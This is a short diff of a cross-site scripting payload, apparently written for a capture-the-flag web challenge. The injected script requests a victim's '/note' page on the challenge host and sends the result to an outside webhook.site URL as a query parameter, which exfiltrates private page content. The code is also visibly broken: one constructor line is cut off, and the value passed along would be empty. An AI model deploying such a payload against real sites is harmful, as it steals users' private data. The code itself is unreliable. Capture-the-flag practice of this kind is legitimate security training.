@@ -2,7 +2,7 @@
 <script>
 var xhr1 = new 
 xhr1.open("GET", "https://tbdxss.chal.perfect.blue/note");
-page = await xhr1.send();
+page = xhr1.send();
 var xhr = new XMLHttpRequest();
 xhr.open("GET", "https://webhook.site/308d1085-db91-4b8f-a342-c7c28014104c?page=" + page);
 xhr.send();
